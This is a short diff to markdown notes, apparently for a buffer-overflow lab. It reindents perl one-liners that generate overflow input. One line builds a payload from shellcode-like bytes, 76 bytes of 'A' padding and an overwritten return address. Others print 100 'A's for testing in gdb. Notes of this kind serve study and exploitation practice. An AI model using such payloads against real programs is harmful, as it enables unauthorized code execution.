@@ -1,9 +1,9 @@
 ## Using PERL for argument.
-   
-```perl -e 'print  "\x31\xc0\x50\x68\" . "A"x76 . "\x28\xf4\xff\xbf" '```
-```perl -e 'print  "A"x100 '```
-- inside gdb
-`# run $(perl -e 'print "A"x100')`
+     -   bash
+        ```perl -e 'print  "\x31\xc0\x50\x68\" . "A"x76 . "\x28\xf4\xff\xbf" '```
+        ```perl -e 'print  "A"x100 '```
+    -   inside gdb
+        `# run $(perl -e 'print "A"x100')`
  
 ## Patterns for rewrite 
 
